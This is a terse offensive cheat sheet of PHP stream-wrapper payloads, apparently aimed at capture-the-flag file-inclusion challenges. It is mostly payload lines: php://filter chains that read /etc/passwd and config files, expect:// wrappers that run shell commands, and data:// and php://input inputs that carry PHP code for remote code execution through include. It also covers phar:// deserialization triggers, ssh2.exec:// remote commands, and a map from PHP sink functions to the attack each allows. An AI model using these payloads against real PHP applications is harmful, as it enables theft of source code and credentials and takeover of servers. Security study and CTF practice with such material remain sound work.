# PHP Wrappers — the `php://`/`phar://`/`expect://`/`data:`/`zip://` family

## The wrapper-as-primitive — each scheme is a different power

PHP's stream wrappers change what "read a file" means — a filter-chain
transforms, a phar deserializes, an expect executes. The wrapper is the
primitive's escalation dial.

## `php://filter` — the transform engine

```
php://filter/<filters>/resource=<path>
php://filter/read=<f1>|<f2>/resource=<path>
php://filter/write=<f1>|<f2>/resource=<path>
```

### `convert.base64-encode` — the binary-safe read

```
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=/var/www/html/config.php
php://filter/convert.base64-encode/resource=/flag
```

b64 the content — survives binary/`<`/`&` — THE standard source-read.

### `convert.iconv` — the charset-oracle

```
php://filter/convert.iconv.utf-8.utf-16/resource=/flag
php://filter/convert.iconv.ucs-4le.ucs-4/resource=/flag
php://filter/convert.iconv.CP1251.UTF-16/resource=/flag
php://filter/convert.iconv.CP1251.CSSTRING/resource=/flag
```

Charset-transforms — the output byte-shape varies with content — the
`filter-chain-oracle` byte-leak — `web-sqli`'s technique applies.

### `zlib.deflate`/`zlib.inflate` — compression

```
php://filter/zlib.deflate/resource=/flag
php://filter/zlib.deflate/convert.base64-encode/resource=/flag
php://filter/zlib.inflate/resource=/x.gz
php://filter/zlib.inflate/resource=/x.zip
```

### `string.*` — the string filters

```
php://filter/string.rot13/resource=/flag
php://filter/string.toupper/resource=/flag
php://filter/string.tolower/resource=/flag
php://filter/string.strip_tags/resource=/flag
```

### `convert.quoted-printable-encode`/`convert.uuencode`

```
php://filter/convert.quoted-printable-encode/resource=/flag
php://filter/convert.uuencode/resource=/flag
```

### `convert.base64-decode` — the decode

```
php://filter/convert.base64-decode/resource=/x.b64
```

### The filter-chain composition — `|`-separated

```
php://filter/zlib.deflate|convert.base64-encode/resource=/flag
php://filter/convert.iconv.UCS-4LE.UCS-4|convert.base64-encode/resource=/flag
php://filter/convert.base64-encode|convert.base64-decode/resource=/flag
```

`|` chains — order matters — the transform-composition engine.

### The `read=`/`write=` split — directional filtering

```
php://filter/read=convert.base64-encode/resource=/flag   — read-dir only
php://filter/write=convert.base64-decode/resource=/flag  — write-dir only
```

## `php://input`/`php://stdin`/`php://stdout`/`php://stderr`

```
php://input             — the request body — as code if include'd
php://stdin             — stdin
php://stdout
php://stderr
php://filter/convert.base64-encode/resource=php://input
```

`php://input` — the request-body-as-file — if the param is `include`'d,
the body executes — RCE via `include 'php://input'` + a PHP body.

## `php://memory`/`php://temp`/`php://fd/N`

```
php://memory
php://temp
php://fd/3 php://fd/4 ...    — PHP's open fds
```

`php://fd/N` — PHP's open file descriptors — `/proc/self/fd/N` equiv.

## `phar://` — the deser-trigger

```
phar:///path/to/x.phar/a
phar://./uploads/x.phar/y
phar:///tmp/x.jpg/anything     — a renamed phar still triggers
```

`phar://` access unserializes the phar's METADATA — the metadata is
the serialized payload — `phar://` + an upload = the deser-trigger —
`web-deserialization`.

## `expect://` — the PECL exec

```
expect://id
expect://cat%20/flag
expect://cat$IFS/flag
expect://ls%20-la%20/
expect://find%20/%20-name%20'flag*'
```

The `expect` PECL extension — `expect://<cmd>` runs the command — the
output is the stream — DIRECT EXEC — `read-to-rce.md`.

## `data:` — the inline-content wrapper

```
data://text/plain;base64,aGVsbG8=
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
data:,text
data://text/plain,<?php phpinfo();?>
```

`data:` embeds content inline — if the param is `include`'d, the data
executes — `include 'data://text/plain;base64,<b64-php>'` = RCE.

## `zip://`/`rar://`/`ogg://`/`bzip2://`/`compress.*`

```
zip:///path/x.zip#inside/file.php
zip://./uploads/x.zip%23shell.php
rar:///x.rar#file.php
compress.zlib://x.gz
compress.bzip2://x.bz2
ogg://x.ogg
```

`zip://`/`phar://` read inside archives — `compress.*` decompresses —
`zip://`+`#`= the member path.

## `glob://` — the directory-listing wrapper

```
glob:///var/www/html/*.php
glob:///etc/*.conf
glob://./uploads/*
```

`glob://` — the pattern-match read — a directory-listing oracle —
`glob://*` = `ls`.

## `ssh2://`/`sftp://`/`scp://` — the ssh wrappers

```
ssh2.exec://user:pass@host/cmd
ssh2.sftp://user:pass@host/path
ssh2.scp://user@host/path
ssh2.shell://user:pass@host/
```

The `ssh2` extension — `ssh2.exec://` runs a remote command — extension-
dependent, rare, devastating.

## `ftp://`/`ftps://` — the ftp wrappers

```
ftp://user:pass@host/file
ftps://user:pass@host/file
```

## `rar://`/`file://`/`file:`/`http:`/`https:` — the file/network

```
file:///etc/passwd
file://./config.php          — relative file://
http://127.0.0.1/flag        — http-fetch through the wrapper
https://internal/x
```

## The "which wrapper is the primitive" — the param-type map

- the param is `include`/`require`-style → `php://input`/`data:`/`expect://`/`phar://` = RCE
- the param is `file_get_contents`/`readfile`/`fopen`/`file`/`show_source`/`highlight_file` → `php://filter`/`zip://`/`phar://` = read/deser
- the param is `file_exists`/`is_file`/`is_readable`/`is_dir`/`filesize`/`stat` → `phar://`/`glob://` = metadata-oracle
- the param is `opendir`/`scandir`/`glob()` → `glob://`/`dir://` = listing

## The "the wrapper decides the payload" — the sink-map

| Sink | The primitive |
|---|---|
| `include`/`require`/`include_once`/`require_once` | RCE |
| `file_get_contents`/`readfile`/`file`/`fpassthru`/`readgzfile`/`show_source`/`highlight_file`/`parse_ini_file`/`md5_file`/`sha1_file`/`hash_file`/`file_get_contents`/`filectime`/`filemtime`/`fileatime`/`filesize`/`file_exists`/`is_file`/`is_readable`/`is_writable`/`is_executable`/`is_dir`/`is_link`/`stat`/`lstat`/`realpath`/`pathinfo`/`basename`/`dirname`/`readline`/`fopen`/`get_meta_tags`/`mime_content_type`/`filetype`/`fileperms`/`finfo_file`/`exif_read_data`/`getimagesize`/`imagecreatefrom*`/`hash_file`/`xxhash_file`/`SplFileObject`/`RecursiveDirectoryIterator`/`DirectoryIterator`/`FilesystemIterator`/`glob`/`scandir`/`opendir`/`readdir` | read/metadata |
| `unlink`/`rename`/`copy`/`mkdir`/`rmdir`/`touch`/`chmod`/`chown`/`chgrp`/`symlink`/`link`/`move_uploaded_file`/`file_put_contents`/`fwrite`/`fputs` | write |

Each sink's wrapper-handling decides which primitive fires.
